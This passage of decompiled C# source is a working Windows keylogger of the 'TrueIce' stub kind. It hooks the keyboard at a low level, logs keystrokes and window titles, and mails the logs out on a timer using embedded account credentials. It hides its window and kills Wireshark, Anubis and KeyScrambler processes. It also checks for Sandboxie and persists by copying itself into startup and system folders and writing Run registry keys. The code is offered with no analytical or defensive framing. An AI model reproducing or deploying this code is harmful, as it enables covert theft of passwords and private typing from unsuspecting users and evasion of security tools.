            this.logBox.Text += "/";
            break;
          case Keys.F1:
            this.logBox.Text += "[F1]";
            break;
          case Keys.F2:
            this.logBox.Text += "[F2]";
            break;
          case Keys.F3:
            this.logBox.Text += "[F3]";
            break;
          case Keys.F4:
            this.logBox.Text += "[F4]";
            break;
          case Keys.F5:
            this.logBox.Text += "[F5]";
            break;
          case Keys.F6:
            this.logBox.Text += "[F6]";
            break;
          case Keys.F7:
            this.logBox.Text += "[F7]";
            break;
          case Keys.F8:
            this.logBox.Text += "[F8]";
            break;
          case Keys.F9:
            this.logBox.Text += "[F9]";
            break;
          case Keys.F10:
            this.logBox.Text += "[F10]";
            break;
          case Keys.F11:
            this.logBox.Text += "[F11]";
            break;
          case Keys.F12:
            this.logBox.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.logBox.Text += ":";
            break;
          case Keys.Oemcomma:
            this.logBox.Text += "<";
            break;
          case Keys.OemMinus:
            this.logBox.Text += "_";
            break;
          case Keys.OemPeriod:
            this.logBox.Text += ">";
            break;
          case Keys.OemQuestion:
            this.logBox.Text += "?";
            break;
          case Keys.Oemtilde:
            this.logBox.Text += "~";
            break;
          case Keys.OemOpenBrackets:
            this.logBox.Text += "{";
            break;
          case Keys.OemPipe:
            this.logBox.Text += "|";
            break;
          case Keys.OemCloseBrackets:
            this.logBox.Text += "}";
            break;
        }
      }
    }

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

    public void Sandbox()
    {
      string lpModuleName = "SbieDll.dll";
      if (Form1.GetModuleHandle(ref lpModuleName) != 0L)
        ;
      bool flag = false;
      if (flag)
      {
        this.Close();
      }
      else
      {
        int num = flag ? 1 : 0;
      }
    }

    public void Anubis()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "anubis", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void WireShark()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "wireshark", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void Keyscrambler()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "keyscrambler", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void RegOmg()
    {
      try
      {
        RegistryKey registryKey;
        if (Operators.CompareString(this.regLoc, "CurUser", false) == 0)
          registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        else if (Operators.CompareString(this.regLoc, "LocMach", false) == 0)
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        string commandLineArg = Environment.GetCommandLineArgs()[0];
        Path.GetFileName(commandLineArg);
        registryKey.SetValue(this.regName, (object) commandLineArg);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) "Fail add");
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Visible = false;
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.gUser = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.gPass = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.sendTo = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.Tval = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.customVal = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.key = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.pEnabler = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.body = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.title = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.wiresharkE = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.sandboxE = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.anubisE = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.keyscramblerE = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.dropLoc = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.dropName = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.eDrop = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.regLoc = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.regName = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.eReg = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.ffon = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.gUser);
      FileSystem.FileGet(1, ref this.gPass);
      FileSystem.FileGet(1, ref this.sendTo);
      FileSystem.FileGet(1, ref this.Tval);
      FileSystem.FileGet(1, ref this.customVal);
      FileSystem.FileGet(1, ref this.key);
      FileSystem.FileGet(1, ref this.pEnabler);
      FileSystem.FileGet(1, ref this.body);
      FileSystem.FileGet(1, ref this.title);
      FileSystem.FileGet(1, ref this.wiresharkE);
      FileSystem.FileGet(1, ref this.sandboxE);
      FileSystem.FileGet(1, ref this.anubisE);
      FileSystem.FileGet(1, ref this.keyscramblerE);
      FileSystem.FileGet(1, ref this.dropLoc);
      FileSystem.FileGet(1, ref this.dropName);
      FileSystem.FileGet(1, ref this.eDrop);
      FileSystem.FileGet(1, ref this.regLoc);
      FileSystem.FileGet(1, ref this.regName);
      FileSystem.FileGet(1, ref this.eReg);
      FileSystem.FileGet(1, ref this.ffon);
      FileSystem.FileClose(1);
      string[] strArray = Strings.Split(this.gUser, "<@@TrueIce@@>");
      this.gUser = strArray[1];
      this.gPass = strArray[2];
      this.sendTo = strArray[3];
      this.Tval = strArray[4];
      this.customVal = strArray[5];
      this.key = strArray[6];
      this.pEnabler = strArray[7];
      this.body = strArray[8];
      this.title = strArray[9];
      this.wiresharkE = strArray[10];
      this.sandboxE = strArray[11];
      this.anubisE = strArray[12];
      this.keyscramblerE = strArray[13];
      this.dropLoc = strArray[14];
      this.dropName = strArray[15];
      this.eDrop = strArray[16];
      this.regLoc = strArray[17];
      this.regName = strArray[18];
      this.eReg = strArray[19];
      this.ffon = strArray[20];
      if (Operators.CompareString(this.pEnabler, "Null", false) != 0 && Operators.CompareString(MySettingsProperty.Settings.MsgBox, "Null", false) == 0)
      {
        int num = (int) Interaction.MsgBox((object) this.body, MsgBoxStyle.Critical, (object) this.title);
        MySettingsProperty.Settings.MsgBox = "Done";
        MySettingsProperty.Settings.Save();
      }
      if (Operators.CompareString(this.wiresharkE, "Active", false) == 0)
        this.WireShark();
      if (Operators.CompareString(this.sandboxE, "Active", false) == 0)
        this.Sandbox();
      this.FlushMemory();
      if (Operators.CompareString(this.anubisE, "Active", false) == 0)
        this.Anubis();
      this.FlushMemory();
      if (Operators.CompareString(this.keyscramblerE, "Active", false) == 0)
        this.Keyscrambler();
      this.FlushMemory();
      string fileName = Path.GetFileName(Environment.GetCommandLineArgs()[0]);
      string folderPath1 = Environment.GetFolderPath(Environment.SpecialFolder.System);
      string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
      string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
      this.FlushMemory();
      this.FlushMemory();
      string str;
      if (Operators.CompareString(this.eDrop, "Active", false) == 0)
      {
        if (Operators.CompareString(this.dropLoc, "1", false) == 0)
        {
          string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
          try
          {
            System.IO.File.Copy(fileName, folderPath5 + "\\" + this.dropName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          str = folderPath5 + "\\" + this.dropName;
        }
        else if (Operators.CompareString(this.dropLoc, "2", false) == 0)
        {
          try
          {
            System.IO.File.Copy(fileName, Path.GetDirectoryName(Environment.SystemDirectory) + "\\" + this.dropName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          str = Path.GetDirectoryName(Environment.SystemDirectory) + "\\" + this.dropName;
        }
        else if (Operators.CompareString(this.dropLoc, "3", false) == 0)
        {
          try
          {
            System.IO.File.Copy(fileName, folderPath2 + "\\" + this.dropName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          str = folderPath2 + "\\" + this.dropName;
        }
        else if (Operators.CompareString(this.dropLoc, "4", false) == 0)
        {
          try
          {
            System.IO.File.Copy(fileName, folderPath3 + "\\" + this.dropName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          str = folderPath3 + "\\" + this.dropName;
        }
        else if (Operators.CompareString(this.dropLoc, "5", false) == 0)
        {
          try
          {
            System.IO.File.Copy(fileName, folderPath1 + "\\" + this.dropName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          str = folderPath1 + "\\" + this.dropName;
        }
        else if (Operators.CompareString(this.dropLoc, "6", false) == 0)
        {
          try
          {
            System.IO.File.Copy(fileName, folderPath4 + "\\" + this.dropName);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          str = folderPath4 + "\\" + this.dropName;
        }
      }
      this.FlushMemory();
      if (Operators.CompareString(this.eReg, "Active", false) == 0 & this.eDrop.Contains("Nu"))
      {
        this.FlushMemory();
        try
        {
          this.RegOmg();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else if (Operators.CompareString(this.eReg, "Active", false) == 0 & Operators.CompareString(this.eDrop, "Active", false) == 0)
      {
        if (Operators.CompareString(this.regLoc, "CurUser", false) == 0)
        {
          try
          {
            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.regName, (object) str);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(this.regLoc, "LocMach", false) == 0)
        {
          try
          {
            Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(this.regName, (object) str);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      this.FlushMemory();
      if (Operators.CompareString(this.customVal, "Null", false) == 0)
      {
        string tval = this.Tval;
        if (Operators.CompareString(tval, "10", false) == 0)
          this.timerVal = "600000";
        else if (Operators.CompareString(tval, "20", false) == 0)
          this.timerVal = "1200000";
        else if (Operators.CompareString(tval, "30", false) == 0)
          this.timerVal = "1800000";
        else if (Operators.CompareString(tval, "40", false) == 0)
          this.timerVal = "2400000";
        else if (Operators.CompareString(tval, "50", false) == 0)
          this.timerVal = "3000000";
        else if (Operators.CompareString(tval, "60", false) == 0)
          this.timerVal = "3600000";
        this.logTimer.Interval = Conversions.ToInteger(this.timerVal);
      }
      else
        this.logTimer.Interval = Conversions.ToInteger(this.customVal);
      this.logTimer.Start();
      this.FlushMemory();
      this.windowsTimer.Start();
    }

    public static string TripleDES(string Text, string Password, bool Reverse = false)
    {
label_0:
      int num1;
      string str1;
      int num2;
      try
      {
        int num3 = 1;
        string str2 = (string) null;
label_1:
        num3 = 2;
        TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
label_2:
        num3 = 3;
        MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
label_3:
        num3 = 4;
        cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(Password));
label_4:
        num3 = 5;
        cryptoServiceProvider1.Mode = CipherMode.ECB;
label_5:
        num3 = 6;
        switch (Reverse)
        {
          case false:
            goto label_10;
          case true:
            break;
          default:
            goto label_13;
        }
label_6:
        num3 = 10;
        ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
label_7:
        ProjectData.ClearProjectError();
        num1 = -2;
label_8:
        num3 = 12;
        byte[] inputBuffer = Convert.FromBase64String(Text);
label_9:
        num3 = 13;
        str2 = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
        goto label_13;
label_10:
        num3 = 16;
        ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
label_11:
        num3 = 17;
        byte[] bytes = Encoding.ASCII.GetBytes(Text);
label_12:
        num3 = 18;
        str2 = Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
label_13:
        str1 = str2;
        goto label_20;
label_15:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 14:
              case 19:
              case 20:
                goto label_13;
              case 8:
              case 10:
                goto label_6;
              case 11:
                goto label_7;
              case 12:
                goto label_8;
              case 13:
                goto label_9;
              case 15:
              case 16:
                goto label_10;
              case 17:
                goto label_11;
              case 18:
                goto label_12;
              case 21:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_20:
      string str3 = str1;
      if (num2 == 0)
        return str3;
      ProjectData.ClearProjectError();
      return str3;
    }

    private void windowsTimer_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.strin, this.GetActiveWindowTitle(), false) == 0)
        return;
      this.logBox.Text = this.logBox.Text + "\r\n" + Conversions.ToString(DateAndTime.TimeOfDay) + "   ==============" + this.GetActiveWindowTitle() + "==============\r\n";
      this.strin = this.GetActiveWindowTitle();
    }

    private void logTimer_Tick(object sender, EventArgs e)
    {
      try
      {
        this.bWork.RunWorkerAsync();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      try
      {
        this.Mail();
        this.logBox.Text = "";
        this.bWork.CancelAsync();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public class KeyboardHook
    {
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Form1.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Form1.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Form1.KeyboardHook.KeyDownEventHandler KeyDown;

      public static event Form1.KeyboardHook.KeyUpEventHandler KeyUp;

      public KeyboardHook()
      {
        Form1.KeyboardHook.KeyHookDelegate = new Form1.KeyboardHook.KeyboardProcDelegate(Form1.KeyboardHook.KeyboardProc);
        Form1.KeyboardHook.KeyHook = Form1.KeyboardHook.SetWindowsHookEx(13, Form1.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              Form1.KeyboardHook.KeyDownEventHandler keyDownEvent = Form1.KeyboardHook.KeyDownEvent;
              if (keyDownEvent != null)
              {
                keyDownEvent((Keys) lParam.vkCode);
                break;
              }
              break;
            case 257:
            case 261:
              Form1.KeyboardHook.KeyUpEventHandler keyUpEvent = Form1.KeyboardHook.KeyUpEvent;
              if (keyUpEvent != null)
              {
                keyUpEvent((Keys) lParam.vkCode);
                break;
              }
              break;
          }
        }
        return Form1.KeyboardHook.CallNextHookEx(Form1.KeyboardHook.KeyHook, nCode, wParam, lParam);
      }

      ~KeyboardHook()
      {
        Form1.KeyboardHook.UnhookWindowsHookEx(Form1.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      public delegate void KeyDownEventHandler(Keys Key);

      public delegate void KeyUpEventHandler(Keys Key);
    }
  }
}
